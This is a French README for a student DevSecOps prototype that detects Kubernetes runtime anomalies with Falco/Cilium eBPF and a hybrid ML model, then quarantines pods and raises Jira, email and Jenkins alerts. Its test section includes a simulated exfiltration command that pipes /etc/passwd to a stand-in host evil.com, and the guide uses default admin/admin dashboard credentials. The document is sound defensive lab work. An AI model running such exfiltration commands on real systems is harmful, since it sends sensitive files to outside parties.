# 🛡️ Prototype DevSecOps IA (PFE)
### Détection Runtime d'Anomalies eBPF & Remédiation Automatisée par Quarantaine Réseau Cilium

Bienvenue sur le référentiel du projet **DevSecOps AI Prototype**. Ce système implémente une chaîne complète de détection en temps réel et de réponse automatisée aux incidents de sécurité sur Kubernetes en combinant **eBPF (Falco & Cilium)**, une **IA Hybride de Machine Learning (Random Forest + User Behavior Analytics / Isolation Forest)**, un monitoring avec **Prometheus & Grafana**, ainsi qu'une remédiation automatisée orchestrée avec **Jira Cloud**, **alertes Gmail** et **Jenkins CI/CD**.

---

## 📑 Sommaire

1. [Vue d'Ensemble & Architecture Globale](#-vue-densemble--architecture-globale)
2. [Composants Clés du Système](#-composants-clés-du-système)
3. [Démarrage Rapide du Lab](#-démarrage-rapide-du-lab)
4. [Guide d'Accès à Tous les Dashboards & Interfaces](#-guide-daccès-à-tous-les-dashboards--interfaces)
   - [1. Dashboard Grafana](#1-dashboard-grafana)
   - [2. Dashboard Prometheus](#2-dashboard-prometheus)
   - [3. Dashboard Falcosidekick UI](#3-dashboard-falcosidekick-ui)
   - [4. Logs & Statut Falco eBPF](#4-logs--statut-falco-ebpf)
   - [5. API & Métriques du Collector (collector.py)](#5-api--métriques-du-collector-collectorpy)
   - [6. Interface Jenkins (CI/CD Incident Response)](#6-interface-jenkins-cicd-incident-response)
5. [Comment Tester Tout le Système (Guide Rapide)](#-comment-tester-tout-le-système-guide-rapide)
6. [Structure Détaillée du Répertoire](#-structure-détaillée-du-répertoire)
7. [Documentation Complémentaire](#-documentation-complémentaire)

---

## 🏗️ Vue d'Ensemble & Architecture Globale

Le projet protège un cluster Kubernetes local (**Kind**) en interceptant tous les appels système (syscalls) au niveau du noyau Linux via **eBPF**, sans modifier le code applicatif.

```text
       ┌─────────────────────────────────────────────────────────────┐
       │                 Cluster Kubernetes (Kind)                   │
       │                                                             │
       │  [ Pod demo-app (nginx) ] ──── Syscalls ────► [ Kernel ]    │
       │                                                   │         │
       │  [ Cilium CNI (eBPF) ]                            ▼         │
       │       ▲  (Quarantine Policy)           [ Falco Modern eBPF ]│
       │       │                                           │         │
       │       │                                           ▼         │
       │       │                                   [ Falcosidekick ] │
       └───────┼───────────────────────────────────────────┼─────────┘
               │                                           │ Webhook HTTP POST
               │ kubectl label                             ▼ (:5002/events)
       ┌───────┴─────────────────────────────────────────────────────┐
       │                Collector IA (src/collector.py)              │
       │                                                             │
       │  1. Feature Engineering (22 dimensions & extraction IOCs)   │
       │  2. Moteur IA Hybride (models/engine.py) :                  │
       │       - Couche 1 : Random Forest (Modèle Global)    [35%]   │
       │       - Couche 2 : Isolation Forest + UBA Profils   [65%]   │
       │       - Arbitrage contextuel & vérification IOC             │
       │  3. Prise de Décision :                                     │
       │       - Score < 45  : Normal / Suspect léger (Pas d'action) │
       │       - Score 45-69 : Alerte Modérée (Prometheus/Grafana)   │
       │       - Score ≥ 70  : 🚨 ANOMALIE CRITIQUE DÉCLENCHÉE       │
       │  4. Remédiation & Orchestration :                           │
       │       - Quarantaine Cilium (label quarantine=true)          │
       │       - Auto-scaling du Deployment (+1 replica sain)        │
       │       - Export Métriques Prometheus (:8000/metrics)         │
       │       - Enregistrement Incident JSON (src/data/incidents/)  │
       │       - Création / Mise à jour Ticket Jira Cloud            │
       │       - Notification Email Gmail                            │
       │       - Webhook de déclenchement Pipeline Jenkins           │
       └─────────────────────────────────────────────────────────────┘
```

---

## 🧩 Composants Clés du Système

1. **Kind Cluster** : Cluster Kubernetes multi-nœuds (1 control-plane, 1 worker) avec CNI par défaut désactivé.
2. **Cilium CNI** : Dataplane réseau ultra-performant basé sur eBPF, appliquant les politiques `CiliumNetworkPolicy` d'isolation de niveau L3/L4/L7.
3. **Falco (eBPF)** : Détecteur d'intrusion runtime basé sur le driver `modern_ebpf` et des règles personnalisées dans [`terraform/falco_rules.local.yaml`](file:///home/eya/devsecops-ai-prototype/terraform/falco_rules.local.yaml).
4. **Falcosidekick & UI** : Routeur d'événements multiplexant les alertes de sécurité vers le webhook Flask du collector et un dashboard web dédié.
5. **Collector IA (`src/collector.py`)** : Cerveau central en Python/Flask recevant les flux d'événements, effectuant l'inférence IA, pilotant la remédiation et exposant les métriques Prometheus.
6. **Moteur IA Hybride (`src/models/engine.py`)** :
   - *Couche 1 (Global)* : Random Forest supervisé entraîné pour classifier les attaques génériques.
   - *Couche 2 (UBA)* : Profilage comportemental spécifique par utilisateur/UID (`dev`, `bot`, `admin`, `root`) combiné à un modèle non-supervisé **Isolation Forest**.
7. **Kube-Prometheus-Stack & Grafana** : Collecte des métriques en temps réel (scrape toutes les 5s) et visualisation sur un dashboard SOC préconfiguré.
8. **Jenkins CI/CD** : Déclenchement automatique de pipelines de réponse à incident (forensics, analyse de l'image Docker, audit de sécurité).

---

## 🚀 Démarrage Rapide du Lab

### Prérequis
- Docker installé et actif.
- Terraform (≥ 1.5.0), Helm (≥ 3.10), `kubectl` et `kind`.
- Python 3.10+ avec les bibliothèques du projet (`pip install -r src/requirements.txt` ou `flask`, `prometheus-client`, `pandas`, `scikit-learn`, `requests`).

### 1. Déploiement de l'Infrastructure avec Terraform
```bash
cd /home/eya/devsecops-ai-prototype/terraform
terraform init
terraform apply -auto-approve
```
*Terraform provisionne le cluster Kind, déploie Cilium, Falco (avec le webhook configuré vers votre machine hôte), Prometheus, Grafana, l'application de démo Nginx et la politique de quarantaine Cilium.*

### 2. Configuration des Variables d'Environnement
Copiez le modèle et éditez vos identifiants si souhaité (Jira, Gmail, Jenkins) :
```bash
cd /home/eya/devsecops-ai-prototype
cp .env.example .env
export KUBECONFIG="$(pwd)/terraform/devsecops-lab-config"
```

### 3. Lancement du Collector IA
Dans un terminal dédié :
```bash
cd /home/eya/devsecops-ai-prototype
python3 src/collector.py
```
*Le collector démarre :*
- Webhook Falco : `http://0.0.0.0:5002/events`
- Métriques Prometheus : `http://0.0.0.0:8000/metrics`
- Healthcheck : `http://0.0.0.0:5002/healthz`

---

## 🖥️ Guide d'Accès à Tous les Dashboards & Interfaces

Voici comment ouvrir et exploiter chaque dashboard et interface du système :

---

### 1. Dashboard Grafana

Grafana permet de visualiser en temps réel les scores d'anomalie IA, les alertes critiques, les remédiations Cilium et le statut des tickets Jira.

- **Option A : Via Port-Forward (Recommandé)**
  ```bash
  kubectl --kubeconfig=/home/eya/devsecops-ai-prototype/terraform/devsecops-lab-config \
    port-forward svc/kube-prometheus-stack-grafana 3000:80 -n monitoring
  ```
  Ouvrez ensuite : **`http://localhost:3000`**

- **Option B : Via NodePort**
  Grafana est exposé sur le port **30030** : **`http://localhost:30030`**

- **Identifiants de connexion :**
  - **Identifiant :** `admin`
  - **Mot de passe :** `admin` (ou la valeur de `var.grafana_admin_password`)

- **Importer le Dashboard SOC du Projet :**
  1. Cliquez dans le menu de gauche sur **Dashboards** > **New** > **Import**.
  2. Cliquez sur **Upload JSON file** et sélectionnez :
     [`config/grafana_dashboard.json`].
  3. Sélectionnez la datasource **Prometheus** et cliquez sur **Import**.
  4. Le dashboard affiche 6 panels temps réel :
     - 🔴 **Alertes Critiques IA** (`devsecops_ai_alerts_total{severity="critical"}`)
     - 🟠 **Quarantaines Cilium réussies** (`devsecops_remediations_total{status="success"}`)
     - 🔵 **Tickets Jira créés** (`devsecops_jira_tickets_total{status="created"}`)
     - ⚪ **Événements Falco reçus** (`devsecops_falco_events_total`)
     - 📈 **Score d'Anomalie IA par Utilisateur/Pod** (Courbe temps réel avec seuils vert < 45, jaune 45-70, rouge ≥ 70)
     - 📊 **Historique des statuts Jira** (created / reused / skipped)

---

### 2. Dashboard Prometheus

Prometheus collecte toutes les métriques système et scrape directement le collector IA toutes les 5 secondes via le job `devsecops-ai`.

- **Option A : Via Port-Forward (Recommandé)**
  ```bash
  kubectl --kubeconfig=/home/eya/devsecops-ai-prototype/terraform/devsecops-lab-config \
    port-forward svc/kube-prometheus-stack-prometheus 9090:9090 -n monitoring
  ```
  Ouvrez ensuite : **`http://localhost:9090`**

- **Option B : Via NodePort**
  Disponible sur : **`http://localhost:30090`**

- **Vérifications & Requêtes Clés :**
  1. **Vérifier la cible de scrape :** Rendez-vous dans le menu **Status** > **Targets**. Vérifiez que le job `devsecops-ai` (`<collector_host>:8000`) est bien **UP**.
  2. **Requêtes PromQL utiles (dans l'onglet Expression/Graph) :**
     - Voir le score actuel de l'IA :
       ```promql
       devsecops_ai_anomaly_score
       ```
     - Voir le débit des événements Falco reçus :
       ```promql
       rate(devsecops_falco_events_total[1m])
       ```
     - Nombre total d'alertes par sévérité :
       ```promql
       devsecops_ai_alerts_total
       ```
     - Statut des remédiations de pods :
       ```promql
       devsecops_remediations_total
       ```

---

### 3. Dashboard Falcosidekick UI

Falcosidekick dispose d'une interface web très intuitive affichant tous les événements Falco bruts reçus avec leurs tags, sévérités et détails système.

- **Activer Falcosidekick UI (si désactivé dans Helm) :**
  Dans [`terraform/falco.tf`], modifiez :
  ```hcl
  set {
    name  = "falcosidekick.webui.enabled"
    value = "true"
  }
  ```
  Puis appliquez avec `cd terraform && terraform apply -auto-approve` ou via Helm :
  ```bash
  helm upgrade falco falcosecurity/falco -n falco \
    --kubeconfig=/home/eya/devsecops-ai-prototype/terraform/devsecops-lab-config \
    --set falcosidekick.webui.enabled=true
  ```

- **Accéder au Dashboard :**
  Lancez le port-forward :
  ```bash
  kubectl --kubeconfig=/home/eya/devsecops-ai-prototype/terraform/devsecops-lab-config \
    port-forward svc/falco-falcosidekick-ui 2802:2802 -n falco
  ```
  Ouvrez : **`http://localhost:2802`**

- **Identifiants :**
  - **Identifiant :** `admin`
  - **Mot de passe :** `admin`

- **Ce que vous y trouverez :**
  - Historique interactif de chaque événement eBPF déclenché dans le cluster.
  - Détail des outputs fields (`proc.cmdline`, `user.name`, `k8s.pod.name`, `fd.name`, `connection`).
  - Graphiques de répartition des alertes par priorité (Critical, Warning, Informational).

---

### 4. Logs & Statut Falco eBPF

Pour observer la détection eBPF en temps réel directement à la source :

- **Vérifier l'état des Pods Falco (DaemonSet sur chaque nœud) :**
  ```bash
  kubectl --kubeconfig=/home/eya/devsecops-ai-prototype/terraform/devsecops-lab-config \
    get pods -n falco
  ```

- **Suivre les alertes eBPF en direct dans le terminal :**
  ```bash
  kubectl --kubeconfig=/home/eya/devsecops-ai-prototype/terraform/devsecops-lab-config \
    logs -n falco -l app.kubernetes.io/name=falco -c falco -f
  ```

- **Vérifier les logs du composant Falcosidekick (acheminement webhook) :**
  ```bash
  kubectl --kubeconfig=/home/eya/devsecops-ai-prototype/terraform/devsecops-lab-config \
    logs -n falco -l app.kubernetes.io/name=falcosidekick -f
  ```

---

### 5. API & Métriques du Collector (collector.py)

Le collector Python expose plusieurs endpoints HTTP de diagnostic et d'intégration :

- **Vérifier la bonne santé et le chargement des modèles IA :**
  ```bash
  curl -s http://localhost:5002/healthz | jq .
  ```
  *Réponse :* `{"model_loaded": true, "status": "ok"}`

- **Consulter les métriques Prometheus brutes :**
  ```bash
  curl -s http://localhost:8000/metrics | grep devsecops_
  ```

- **Consulter les détails d'un incident de sécurité généré :**
  Lorsqu'une attaque est stoppée, un incident est généré (ex: `INC-20260929-A1B2C`) :
  ```bash
  # Lister les incidents disponibles sur le disque
  ls src/data/incidents/

  # Consulter l'incident via l'API REST du collector
  curl -s http://localhost:5002/incidents/INC-20260929-A1B2C | jq .
  ```

- **Mettre à jour le statut d'un incident via l'API :**
  ```bash
  curl -X POST http://localhost:5002/incidents/INC-20260929-A1B2C/status \
    -H "Content-Type: application/json" \
    -d '{"status": "RESOLVED", "decision": "quarantine_cleared"}'
  ```

---

### 6. Interface Jenkins (CI/CD Incident Response)

Jenkins est configuré pour exécuter automatiquement le pipeline de réponse à incident `security-incident-response` dès qu'un pod est mis en quarantaine.

- **Option A : Jenkins déployé dans le cluster (via Helm / jenkins-values.yaml)**
  Si Jenkins est déployé dans le cluster :
  ```bash
  kubectl --kubeconfig=/home/eya/devsecops-ai-prototype/terraform/devsecops-lab-config \
    port-forward svc/jenkins 8080:8080 -n jenkins
  ```
  Ouvrez : **`http://localhost:8080`**

- **Récupérer le mot de passe administrateur initial de Jenkins :**
  ```bash
  kubectl --kubeconfig=/home/eya/devsecops-ai-prototype/terraform/devsecops-lab-config \
    exec -n jenkins -it svc/jenkins -c jenkins -- /bin/cat /run/secrets/additional/chart-admin-password
  # ou si standard :
  kubectl get secret -n jenkins jenkins -o jsonpath="{.data.jenkins-admin-password}" | base64 --decode
  ```

- **Option B : Jenkins local ou externe**
  Si vous utilisez une instance Jenkins déjà installée sur votre machine hôte, exportez dans votre `.env` :
  ```bash
  export JENKINS_URL="http://localhost:8080"
  export JENKINS_USER="admin"
  export JENKINS_TOKEN="votre_api_token_jenkins"
  export JENKINS_JOB="security-incident-response"
  export COLLECTOR_PUBLIC_URL="http://172.17.0.1:5002"
  ```

- **Rôle du Job `security-incident-response` :**
  Lorsqu'un score ≥ 70 est détecté, `collector.py` déclenche ce job en lui transmettant en paramètres :
  `INCIDENT_ID`, `NAMESPACE`, `POD`, `SCORE`, `IMAGE`, `RULE`, `USER`, `UID`, `COMMAND`.
  Le pipeline exécute l'analyse forensique, le scan de vulnérabilités Trivy de l'image et l'archivage du rapport d'incident.

---

## 🧪 Comment Tester Tout le Système (Guide Rapide)

Pour exécuter toutes les commandes pas à pas avec les outputs détaillés, consultez le fichier dédié :
👉 **[`SCENARIOS_TESTS.md`]**

Voici un résumé des tests les plus fréquents :

### 1. Test Développeur Bénin (Score Faible, Pas d'impact)
```bash
export KUBECONFIG="/home/eya/devsecops-ai-prototype/terraform/devsecops-lab-config"
export POD=$(kubectl get pods -n demo-app -l app=nginx-demo -o jsonpath='{.items[0].metadata.name}')

kubectl exec -n demo-app $POD -- sh -c "id; ls -la /tmp"
```
*Le collector affiche un score < 20 (`✅ NORMAL`). Le pod continue de fonctionner normalement.*

### 2. Test Attaque Critique C2 / Exfiltration (Score ≥ 70, Quarantaine Immédiate)
```bash
kubectl exec -n demo-app $POD -- sh -c "cat /etc/passwd | curl -s --max-time 5 -X POST -d @- http://evil.com/collect || true"
```
*Effets immédiats :*
1. **Score IA** : 85/100 (`🚨 ANOMALIE CRITIQUE`).
2. **Quarantaine Cilium** : Le pod reçoit le label `quarantine=true`. Le trafic entrant et sortant est coupé par le noyau eBPF.
3. **Haute Disponibilité** : Le Deployment `nginx-demo` est scalé automatiquement à 2 replicas (1 pod compromis isolé pour forensics + 1 nouveau pod sain pour servir les utilisateurs).
4. **Intégrations** : Ticket Jira créé ou mis à jour, alerte email envoyée, incident JSON enregistré, pipeline Jenkins déclenché.
5. **Vérification Réseau** :
   ```bash
   # Le pod isolé ne peut plus joindre l'extérieur :
   kubectl exec -n demo-app $POD -- curl -m 3 https://www.google.com
   # -> Timeout / Connexion impossible !
   ```

### 3. Test Rapide par Simulation (CLI)
Pour vérifier la table de décision IA sur toutes les personas (Dev, Admin, Bot, Attaquant, jour vs nuit) :
```bash
python3 src/demo_decision_table.py
```

---

## 📁 Structure Détaillée du Répertoire

```text
devsecops-ai-prototype/
├── README.md                      # Présentation globale & guide des dashboards (ce fichier)
├── SCENARIOS_TESTS.md             # Guide de tests commandes par commandes (tous scénarios)
├── RAPPORT_TECHNIQUE_DETAILS.md   # Rapport complet d'architecture, calcul du score & configs
├── jenkins-values.yaml            # Configuration Helm pour le déploiement de Jenkins
├── .env.example                   # Gabarit des variables d'environnement (Jira, Gmail, Jenkins)
│
├── config/
│   └── grafana_dashboard.json     # Dashboard Grafana SOC préconfiguré (6 panels)
│
├── datasets/
│   ├── falco_events_enriched.csv  # Dataset synthétique d'entraînement multi-personas
│   └── falco_events_dataset_v2.csv# Dataset live collecté en temps réel
│
├── models/                        # Modèles de Machine Learning sérialisés (.pkl)
│   ├── layer1_global.pkl          # Modèle Random Forest global
│   ├── layer1_encoders.pkl        # Encoders catégoriels fit sur le train
│   ├── layer1_feature_cols.pkl    # Liste des colonnes de features retenues
│   └── uba_if_*.pkl               # Modèles Isolation Forest par utilisateur (0, 472, 999, 1000, 1001)
│
├── profiles/                      # Profils comportementaux UBA au format JSON
│   ├── uba_0.json                 # Profil root
│   ├── uba_999.json               # Profil bot / compte de service CI/CD
│   ├── uba_1000.json              # Profil administrateur
│   └── uba_1001.json              # Profil développeur
│
├── src/
│   ├── collector.py               # Serveur Flask principal (webhook :5002, métriques :8000)
│   ├── run_train.py               # Script d'entraînement des modèles IA (RF + UBA)
│   ├── generate_personas.py       # Générateur des profils synthétiques
│   ├── generate_smart_testdata.py # Générateur du dataset de base Falco
│   ├── demo_decision_table.py     # Script CLI de validation des personas
│   ├── config/
│   │   ├── settings.py            # Paramètres globaux, chemins et ports
│   │   └── iocs.json              # Répertoire des IOCs (domaines C2, chemins sensibles, rôles)
│   ├── core/
│   │   ├── remediation.py         # Application du label de quarantaine Cilium & scaling replica
│   │   ├── alerting.py            # Envoi d'alertes sécurisées par email (Gmail SMTP)
│   │   ├── jira_ticketing.py      # Création/mise à jour de tickets Jira Cloud v3 (ADF)
│   │   ├── incidents.py           # Gestion du cycle de vie des incidents & déclencheur Jenkins
│   │   ├── features.py            # Extraction des 22 caractéristiques pour le ML
│   │   ├── time_features.py       # Analyse temporelle (fuseau horaire, heures creuses)
│   │   ├── iocs_loader.py         # Chargeur des indicateurs de compromission
│   │   └── csv_io.py              # Lecture et écriture robuste du dataset CSV live
│   ├── models/
│   │   ├── engine.py              # Orchestration IA Hybride (35% RF + 65% UBA + arbitrage)
│   │   ├── global_model.py        # Implémentation du Random Forest global
│   │   └── uba_model.py           # Implémentation UBA (profils statistiques + Isolation Forest)
│   └── data/
│       └── incidents/             # Registre des incidents générés au format JSON
│
└── terraform/
    ├── cluster.tf                 # Déploiement du cluster Kind multi-nœuds
    ├── cilium.tf                  # Installation de la CNI Cilium via Helm
    ├── falco.tf                   # Déploiement de Falco (driver modern_ebpf) & Falcosidekick
    ├── falco_rules.local.yaml     # Règles Falco custom (outbound, files, package manager, etc.)
    ├── quarantine-policy.tf       # CiliumNetworkPolicy de quarantaine (deny ingress & egress)
    ├── monitoring.tf              # Kube-Prometheus-Stack (Prometheus + Grafana + Scrape job)
    ├── demo.tf                    # Déploiement de l'application cible demo-app (Nginx)
    ├── variables.tf               # Déclaration des variables Terraform
    ├── outputs.tf                 # URLs et paramètres de connexion générés
    └── devsecops-lab-config       # Fichier kubeconfig généré pour l'accès kubectl
```

---

## 📚 Documentation Complémentaire

Pour approfondir le projet et préparer votre soutenance :
- **[`SCENARIOS_TESTS.md`](file:///home/eya/devsecops-ai-prototype/SCENARIOS_TESTS.md)** : Guide complet des commandes à exécuter une par une pour chaque cas d'usage.
- **[`RAPPORT_TECHNIQUE_DETAILS.md`](file:///home/eya/devsecops-ai-prototype/RAPPORT_TECHNIQUE_DETAILS.md)** : Rapport technique exhaustif analysant la vision globale, le calcul mathématique du score IA, la signification des pipelines Jenkins et chaque paramètre de configuration fichier par fichier.
- **[`GUIDE_SOUTENANCE_ET_ENV.md`](file:///home/eya/devsecops-ai-prototype/GUIDE_SOUTENANCE_ET_ENV.md)** : Discours de soutenance officiel (~10-12 min), exports complets des variables d'environnement (Gmail, Jira, Jenkins) et guide de push GitHub.
